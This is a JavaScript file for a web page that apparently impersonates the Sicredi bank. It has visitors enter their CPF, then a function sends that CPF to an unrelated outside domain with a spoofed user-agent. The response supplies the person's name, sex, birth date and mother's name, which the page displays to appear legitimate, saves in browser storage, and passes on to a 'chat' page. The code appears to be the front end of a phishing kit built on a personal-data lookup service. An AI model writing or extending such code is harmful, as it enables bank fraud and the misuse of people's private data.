document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");
  const dataNascimento = document.getElementById("dataNascimento"); // opcional

  // ==========================
  // HELPERS
  // ==========================
  function formatCPF(input) {
    let value = (input.value || "").replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }

    input.value = value;
  }

  function validarCPF(cpf) {
    cpf = (cpf || "").replace(/[^\d]+/g, "");
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

    let soma = 0, resto;
    for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf[9])) return false;

    soma = 0;
    for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;

    return resto === parseInt(cpf[10]);
  }

  function formatDate(dateString) {
    if (!dateString) return "Não informado";
    if (String(dateString).includes("/")) return dateString;
    if (String(dateString).length === 8) {
      return String(dateString).replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }
    return String(dateString);
  }

  // ==========================
  // TROCA DE TELAS (igual seu fluxo)
  // ==========================
  function showCPFPage() {
    if (!mainPage || !cpfPage) return;

    mainPage.classList.add("fade-out");

    setTimeout(() => {
      mainPage.classList.add("hidden");
      cpfPage.classList.remove("hidden");

      // reflow
      void cpfPage.offsetWidth;

      cpfPage.classList.add("fade-in");
      cpfPage.classList.remove("opacity-0");

      if (cpfInputPage) cpfInputPage.focus();
    }, 400);
  }

  function showMainPage() {
    if (!mainPage || !cpfPage) return;

    cpfPage.classList.remove("fade-in");
    cpfPage.classList.add("opacity-0");

    setTimeout(() => {
      cpfPage.classList.add("hidden");
      mainPage.classList.remove("hidden");

      void mainPage.offsetWidth;

      mainPage.classList.remove("fade-out");
    }, 400);
  }

  // ==========================
  // CONSULTA CPF (API federal-leilao) - SEM TIMEOUT
  // ==========================
  async function consultarCPF(cpf) {
    const cpfLimpo = (cpf || "").replace(/\D/g, "");

    // UI: mostrar área e loading
    consultaResultado?.classList.remove("hidden");
    loadingInfo?.classList.remove("hidden");
    userInfo?.classList.add("hidden");
    errorInfo?.classList.add("hidden");

    consultaResultado?.scrollIntoView({ behavior: "smooth", block: "center" });

    try {
      const url = `https://federal-leilao.com/v1/contratediscordrev0ltz/${encodeURIComponent(cpfLimpo)}`;

      const response = await fetch(url, {
        method: "GET",
        headers: {
          "user-agent":
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          Accept: "application/json",
        },
      });

      const data = response.ok ? await response.json() : null;

      loadingInfo?.classList.add("hidden");

      // Defaults (mantém fluxo mesmo se API falhar)
      let nomeCompleto = "Cliente Sicredi";
      let nascimento = "";
      let sexo = "";
      let mae = "";

      if (data && data.status === 200) {
        nomeCompleto = data.nome || nomeCompleto;
        nascimento = data.nascimento || "";
        sexo = data.sexo || "";
        mae = data.mae || "";
      }

      // Preencher tela
      if (nomeUsuario) nomeUsuario.textContent = nomeCompleto || "Não informado";

      if (cpfUsuario) {
        cpfUsuario.textContent = cpfLimpo
          ? cpfLimpo.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
          : "Não informado";
      }

      if (sexoUsuario) sexoUsuario.textContent = sexo || "Não informado";
      if (nomeMae) nomeMae.textContent = mae || "Não informado";

      if (dataNascimento) {
        dataNascimento.textContent = formatDate(nascimento) || "Não informado";
      }

      // O /chat valida `dadosUsuario.nome` e `dadosUsuario.cpf`
      const dadosUsuario = {
        nome: nomeCompleto || "",
        cpf: cpfLimpo || "",
        sexo: sexo || "",
        nomeMae: mae || "",
        dataNascimento: nascimento || "",
      };

      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
      localStorage.setItem("cpf", cpfLimpo);

      if (dadosUsuario.nome) localStorage.setItem("nomeUsuario", dadosUsuario.nome);
      if (dadosUsuario.cpf) localStorage.setItem("cpfUsuario", dadosUsuario.cpf);

      // Mostrar bloco de confirmação
      userInfo?.classList.remove("hidden");
      setTimeout(() => userInfo?.scrollIntoView({ behavior: "smooth", block: "center" }), 100);
    } catch (err) {
      loadingInfo?.classList.add("hidden");
      if (errorMessage) errorMessage.textContent = "Erro ao consultar seus dados. Tente novamente.";
      errorInfo?.classList.remove("hidden");
      console.error("Erro na consulta:", err);
      errorInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  }

  function processForm() {
    const cpf = (cpfInputPage?.value || "").replace(/\D/g, "");

    if (!validarCPF(cpf)) {
      alert("Por favor, digite um CPF válido.");
      return;
    }

    if (termsCheck && !termsCheck.checked) {
      alert("Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar.");
      return;
    }

    localStorage.setItem("cpf", cpf);
    consultarCPF(cpf);
  }

  // Redirecionar para o chat mantendo params
  function redirecionarParaChat() {
    const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
    if (!dadosUsuarioJSON) {
      alert("Dados do usuário não encontrados. Por favor, tente novamente.");
      return;
    }

    try {
      const dadosUsuario = JSON.parse(dadosUsuarioJSON);
      if (!dadosUsuario.cpf || !dadosUsuario.nome) {
        alert("Dados incompletos. Por favor, reinicie o processo.");
        window.location.href = "./index.html";
        return;
      }

      const cpf = String(dadosUsuario.cpf).replace(/\D/g, "");

      const urlAtual = new URLSearchParams(window.location.search);
      const novaUrl = new URLSearchParams();

      for (const [chave, valor] of urlAtual.entries()) {
        novaUrl.append(chave, valor);
      }

      novaUrl.set("cpf", cpf);

      window.location.href = `./chat/index.html?${novaUrl.toString()}`;
    } catch (error) {
      console.error("Erro ao processar dados para redirecionamento:", error);
      alert("Ocorreu um erro ao processar seus dados. Por favor, tente novamente.");
    }
  }

  function corrigirDados() {
    consultaResultado?.classList.add("hidden");
    if (cpfInputPage) cpfInputPage.focus();
  }

  function tentarNovamente() {
    consultaResultado?.classList.add("hidden");
    if (cpfInputPage) cpfInputPage.focus();
  }

  // ==========================
  // EVENTOS (corrigidos)
  // ==========================
  if (btnAtivar) btnAtivar.addEventListener("click", (e) => { e.preventDefault?.(); showCPFPage(); });
  if (btnSimular) btnSimular.addEventListener("click", (e) => { e.preventDefault?.(); showCPFPage(); });
  if (btnVoltar) btnVoltar.addEventListener("click", (e) => { e.preventDefault?.(); showMainPage(); });

  if (btnAnalisar) {
    btnAnalisar.addEventListener("click", function (e) {
      e.preventDefault?.();
      processForm();
    });
  }

  if (btnConfirmar) btnConfirmar.addEventListener("click", (e) => { e.preventDefault?.(); redirecionarParaChat(); });
  if (btnCorrigir) btnCorrigir.addEventListener("click", (e) => { e.preventDefault?.(); corrigirDados(); });
  if (btnTentarNovamente) btnTentarNovamente.addEventListener("click", (e) => { e.preventDefault?.(); tentarNovamente(); });

  if (cpfInputPage) {
    cpfInputPage.addEventListener("input", function () {
      formatCPF(this);
    });
  }

  // ======================
  // Carrossel (igual antes)
  // ======================
  const carousel = document.getElementById("carousel");
  const slides = document.querySelectorAll(".carousel-item");
  const indicators = document.querySelectorAll(".carousel-indicator");
  const prevBtn = document.getElementById("prev-btn");
  const nextBtn = document.getElementById("next-btn");

  const stepNumbers = document.querySelectorAll(".step-number");
  const stepLines = document.querySelectorAll(".step-line");

  let currentSlide = 0;
  let autoSlideInterval;

  function showSlide(index) {
    if (!slides || slides.length === 0) return;

    if (index < 0) index = slides.length - 1;
    else if (index >= slides.length) index = 0;

    slides.forEach((slide) => slide.classList.remove("active"));
    slides[index].classList.add("active");

    indicators.forEach((indicator, i) => {
      indicator.classList.toggle("active", i === index);
    });

    updateSteps(index);
    currentSlide = index;
  }

  function updateSteps(index) {
    stepNumbers.forEach((step, i) => {
      step.classList.remove("active", "completed");
      if (i === index) step.classList.add("active");
      else if (i < index) step.classList.add("completed");
    });

    stepLines.forEach((line, i) => {
      line.classList.toggle("active", i < index);
    });
  }

  function nextSlide() {
    showSlide(currentSlide + 1);
    resetAutoSlide();
  }

  function prevSlide() {
    showSlide(currentSlide - 1);
    resetAutoSlide();
  }

  function startAutoSlide() {
    autoSlideInterval = setInterval(nextSlide, 5000);
  }

  function resetAutoSlide() {
    clearInterval(autoSlideInterval);
    startAutoSlide();
  }

  if (prevBtn && nextBtn && carousel && slides.length) {
    nextBtn.addEventListener("click", nextSlide);
    prevBtn.addEventListener("click", prevSlide);

    indicators.forEach((indicator, index) => {
      indicator.addEventListener("click", () => {
        showSlide(index);
        resetAutoSlide();
      });
    });

    stepNumbers.forEach((step) => {
      step.addEventListener("click", () => {
        const stepIndex = parseInt(step.getAttribute("data-step"), 10);
        if (!Number.isNaN(stepIndex)) {
          showSlide(stepIndex);
          resetAutoSlide();
        }
      });
    });

    let touchStartX = 0;

    carousel.addEventListener(
      "touchstart",
      (e) => {
        touchStartX = e.changedTouches[0].screenX;
      },
      { passive: true }
    );

    carousel.addEventListener(
      "touchend",
      (e) => {
        const touchEndX = e.changedTouches[0].screenX;
        const diff = touchEndX - touchStartX;

        if (diff > 50) prevSlide();
        else if (diff < -50) nextSlide();
      },
      { passive: true }
    );

    carousel.addEventListener("mouseenter", () => clearInterval(autoSlideInterval));
    carousel.addEventListener("mouseleave", startAutoSlide);

    showSlide(0);
    startAutoSlide();
  }
});
